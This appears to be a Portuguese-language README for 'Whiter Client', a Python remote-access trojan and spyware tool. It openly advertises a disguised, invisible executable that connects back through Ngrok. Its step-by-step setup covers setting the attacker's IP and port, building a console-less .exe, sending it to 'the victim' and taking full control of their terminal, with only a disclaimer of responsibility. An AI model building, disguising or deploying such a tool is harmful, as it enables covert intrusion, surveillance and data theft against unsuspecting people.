

# Whiter Client V2.1

By Dragonmodder (Jhon)

Whiter Client é uma ferramenta de administração remota (RAT) e também um spyware, desenvolvida em Python puro. 

Recursos principais:


Arquivo .exe leve e disfarçado

Invisível (sem console) para não levantar suspeitas

Comunicação via Ngrok — conecta de qualquer lugar

Comandos de terminal em tempo real


Observações:

Caso usar para o mau, eu não me responsabilizo por qualquer dado em telemóveis ou computadores de outras pessoas. 

Instalação

No Android (Termux):

pkg update && pkg install git python -y
git clone https://github.com/Dragonmodder7/Whiter-Client.git
cd Whiter-Client
python client.py

No Linux:

sudo apt update && sudo apt install git python -y
git clone https://github.com/Dragonmodder7/Whiter-Client.git
cd Whiter-Client
python client.py


Instalação (Servidor)

1. Instale o Python e o Ngrok


2. Rode: ngrok tcp 4444 e anote o IP e porta


3. Substitua no client.py o IP e porta


4. Gere o .exe invisível com:

pyinstaller --onefile --noconsole client.py


5. Envie o client.exe para a vítima


6. Execute python server.py e aguarde a conexão


Comandos Disponíveis

cd, ls, cat, exit e todos os comandos de terminal

O terminal da vítima fica 100% sob seu controle. 
